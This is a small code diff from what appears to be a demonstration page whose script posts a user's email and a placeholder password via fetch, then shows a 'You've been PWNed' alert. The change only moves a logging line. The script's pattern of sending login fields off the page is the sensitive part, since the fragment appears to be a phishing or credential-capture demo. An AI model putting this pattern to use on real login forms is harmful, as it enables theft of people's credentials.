@@ -26,10 +26,10 @@
                 body: JSON.stringify({email: email, pass: 'could-have-been-password'})
               });
               const content = await rawResponse.json();
+              console.log(content);
             }catch(e){
               console.log(e)
             }
-            console.log(content);
             alert("You've been PWNed: " + email + " : " + password);
           }
         </script>
